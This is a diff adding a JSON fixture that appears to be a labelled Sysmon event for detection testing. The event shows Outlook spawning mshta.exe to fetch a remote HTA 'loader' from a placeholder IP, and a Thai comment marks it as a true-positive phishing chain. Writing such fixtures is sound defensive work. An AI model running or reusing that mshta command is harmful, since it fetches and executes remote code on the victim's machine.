@@ -1,0 +1,11 @@
+{
+  "EventID": 1,
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "Computer": "FIN-WS07.corp.example.co.th",
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "OriginalFileName": "MSHTA.EXE",
+  "CommandLine": "mshta.exe https://203.0.113.45/update/loader.hta",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+  "User": "CORP\\somchai",
+  "_comment": "TRUE POSITIVE — mshta โหลด payload จาก remote URL (phishing chain)"
+}
